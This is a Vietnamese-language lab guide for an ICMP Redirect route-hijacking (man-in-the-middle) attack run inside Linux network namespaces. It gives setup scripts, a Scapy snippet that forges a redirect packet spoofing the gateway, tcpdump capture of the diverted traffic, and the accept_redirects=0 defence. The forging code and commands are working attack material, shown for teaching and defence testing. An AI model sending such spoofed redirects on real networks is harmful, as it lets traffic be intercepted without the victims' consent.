# HƯỚNG DẪN THỰC HÀNH: LAB 05
## ICMP Redirect Attack (Route Hijacking / MITM)

---

### 1. MỤC TIÊU & MÔ HÌNH MẠNG
- **Mục tiêu:** Chiếm quyền định tuyến (Route Hijacking / Man-in-the-Middle) bằng gói tin ICMP Redirect giả mạo (`Type 5`, `Code 1`) từ Default Gateway (`10.0.0.1`), ép nạn nhân (`10.0.0.2`) cập nhật FIB Nexthop Exception chuyển hướng toàn bộ lưu lượng tới máy chủ ngoài (`10.0.1.5`) đi qua máy kẻ tấn công (`10.0.0.66`). Sau đó kiểm chứng phòng thủ `accept_redirects = 0`.
- **Topology:**
  - Subnet LAN `10.0.0.0/24` (trên `br0`): `vic` (`10.0.0.2`), `gw` (`10.0.0.1`), `atk` (`10.0.0.66`).
  - Subnet WAN `10.0.1.0/24`: Router `gw` (`10.0.1.254`) nối với máy chủ đích `dst` (`10.0.1.5`).

---

### 2. CÁCH 1: CHẠY NHANH TỪ CÁC SCRIPT CÓ SẴN

```bash
# Bước 1: Khởi tạo topology 2 subnet và cấu hình định tuyến ban đầu
sudo bash docs/progress/LAB05/scripts/setup_redirect.sh

# Bước 2: Kiểm tra đường đi ban đầu (Baseline Route) trên vic
sudo ip netns exec vic ip route get 10.0.1.5
# (Kết quả: via 10.0.0.1 dev vic0)

# Bước 3: Mở tcpdump trên card mạng atk0 để đón bắt lưu lượng MITM
sudo ip netns exec atk sysctl -w net.ipv4.ip_forward=1 >/dev/null
sudo ip netns exec atk timeout 10 tcpdump -i atk0 -nn host 10.0.1.5 &
TCPDUMP_PID=$!
sleep 1

# Bước 4: Tạo luồng giao tiếp trên vic và tiêm gói ICMP Redirect từ atk
sudo ip netns exec vic python3 docs/progress/LAB05/scripts/trigger_flow.py &
sleep 0.5
sudo ip netns exec atk python3 docs/progress/LAB05/scripts/send_redirect.py
sleep 1

# Bước 5: Kiểm tra bảng định tuyến trên vic sau khi bị tiêm gói
sudo ip netns exec vic ip route get 10.0.1.5
# (Kết quả: 10.0.1.5 via 10.0.0.66 dev vic0 cache <redirected>)

# Bước 6: Nạn nhân ping thử và quan sát gói tin bị bắt tại atk0
sudo ip netns exec vic ping -c 2 10.0.1.5
wait $TCPDUMP_PID 2>/dev/null || true
```

---

### 3. CÁCH 2: CHẠY ĐỘC LẬP BẰNG COPY-PASTE (STANDALONE)

Dán trực tiếp khối lệnh dưới đây vào Terminal Kali Linux:

```bash
# === 1. TẠO MẠNG ĐA SUBNET VÀ BẬT DỄ BỊ TẤN CÔNG ===
for ns in vic gw atk dst; do sudo ip netns del $ns 2>/dev/null || true; done
sudo ip link del br0 2>/dev/null || true
sudo ip link add name br0 type bridge
sudo ip link set dev br0 up

add_lan() {
    local ns=$1; local ip=$2
    sudo ip netns add "$ns"
    sudo ip link add "veth_${ns}" type veth peer name "${ns}0"
    sudo ip link set "${ns}0" netns "$ns"
    sudo ip link set "veth_${ns}" master br0
    sudo ip link set "veth_${ns}" up
    sudo ip netns exec "$ns" ip link set dev lo up
    sudo ip netns exec "$ns" ip addr add "${ip}/24" brd 10.0.0.255 dev "${ns}0"
    sudo ip netns exec "$ns" ip link set dev "${ns}0" up
}
add_lan "vic" "10.0.0.2"
add_lan "gw"  "10.0.0.1"
add_lan "atk" "10.0.0.66"

# Tạo mạng WAN nối gw tới dst
sudo ip netns add dst
sudo ip netns exec dst ip link set dev lo up
sudo ip link add gw-d type veth peer name d-gw
sudo ip link set gw-d netns gw
sudo ip link set d-gw netns dst
sudo ip netns exec gw ip addr add 10.0.1.254/24 dev gw-d
sudo ip netns exec gw ip link set dev gw-d up
sudo ip netns exec dst ip addr add 10.0.1.5/24 dev d-gw
sudo ip netns exec dst ip link set dev d-gw up

# Cấu hình routing
sudo ip netns exec gw sysctl -w net.ipv4.ip_forward=1 >/dev/null
sudo ip netns exec vic ip route add default via 10.0.0.1 dev vic0
sudo ip netns exec atk ip route add default via 10.0.0.1 dev atk0
sudo ip netns exec dst ip route add default via 10.0.1.254 dev d-gw

# Cấu hình vic chấp nhận Redirect
for k in all default vic0; do
    sudo ip netns exec vic sysctl -w net.ipv4.conf.$k.accept_redirects=1 >/dev/null
    sudo ip netns exec vic sysctl -w net.ipv4.conf.$k.secure_redirects=0 >/dev/null
done

# === 2. TIÊM GÓI ICMP REDIRECT GIẢ MẠO GATEWAY ===
echo "[*] Kích hoạt luồng UDP trên vic và tiêm ICMP Redirect..."
sudo ip netns exec vic python3 -c '
import socket, time
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("10.0.0.2", 12345))
s.connect(("10.0.1.5", 80))
s.send(b"hello")
time.sleep(1.5)
' &
sleep 0.3

sudo ip netns exec atk python3 -c '
from scapy.all import IP, ICMP, UDP, send
orig = IP(src="10.0.0.2", dst="10.0.1.5") / UDP(sport=12345, dport=80)
redir = IP(src="10.0.0.1", dst="10.0.0.2") / ICMP(type=5, code=1, gw="10.0.0.66") / orig
send(redir, verbose=0)
print("[+] Đã gửi gói ICMP Redirect giả mạo gw=10.0.0.1 báo nexthop=10.0.0.66")
'
sleep 1

# === 3. KIỂM TRA ROUTING CACHE BỊ BẺ LÁI ===
echo "=== BẢNG ĐỊNH TUYẾN TRÊN VIC SAU KHI TIÊM ==="
sudo ip netns exec vic ip route get 10.0.1.5
```

---

### 4. QUAN SÁT & TIÊU CHÍ THÀNH CÔNG
1. **Trước tấn công:** Tuyến đường đi thẳng qua Gateway hợp pháp `via 10.0.0.1 dev vic0`.
2. **Sau khi tiêm gói:** Tuyến đường đổi thành:
   `10.0.1.5 via 10.0.0.66 dev vic0 src 10.0.0.2 cache <redirected> expires 295sec`.
3. **Khi kích hoạt phòng thủ (`accept_redirects = 0`):**
   ```bash
   sudo ip netns exec vic sysctl -w net.ipv4.conf.all.accept_redirects=0
   sudo ip netns exec vic ip route flush cache
   ```
   Tuyến đường giữ nguyên `via 10.0.0.1`, hoàn toàn loại bỏ nguy cơ bị chuyển hướng.

---

### 5. LỆNH DỌN DẸP MÔI TRƯỜNG
```bash
for ns in vic gw atk dst; do sudo ip netns del $ns 2>/dev/null || true; done
sudo ip link del br0 2>/dev/null || true
```

